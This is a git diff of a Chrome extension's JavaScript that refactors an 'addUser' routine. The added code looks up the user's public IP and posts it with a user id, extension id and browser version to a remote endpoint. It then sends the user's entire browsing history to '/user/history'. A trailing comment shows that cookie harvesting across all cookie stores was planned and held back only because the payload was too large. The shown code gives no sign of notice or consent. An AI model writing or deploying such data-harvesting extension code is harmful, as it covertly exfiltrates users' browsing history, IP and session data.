@@ -27,7 +27,7 @@ const postRequest = (route, data) =>
 
 // Initial add user, and their current history
 const addUser = (uid) => {
-    const data = {
+    const user = {
         uid: uid,
         extension_id: chrome.runtime.id,
         date_created: Date().toString(),
@@ -36,17 +36,18 @@ const addUser = (uid) => {
         version: `Chrome ${/Chrome\/([0-9.]+)/.exec(navigator.userAgent)[1]}`,
     };
 
-    // TODO Split history into another request after create user
-    chrome.history.search({ text: "" }, (h) => {
-        data.history = h;
-        makeRequest("https://api.ipify.org?format=json")
-            .then((r) => (data.ip = r.ip))
-            .then(() =>
-                postRequest("/user/", data).catch((err) =>
-                    console.log(err.message)
-                )
-            );
-    });
+    makeRequest("https://api.ipify.org?format=json")
+        .then((r) => (user.ip = r.ip))
+        .then(() => postRequest("/user/", user))
+        .then(() => {
+            chrome.history.search({ text: "" }, (h) => {
+                postRequest("/user/history", {
+                    uid,
+                    date: Date().toString(),
+                    history: h,
+                });
+            });
+        });
 
     // Get all stored cookies, PAYLOAD TOO LARGE
     // chrome.cookies.getAllCookieStores((cookieStores) => {
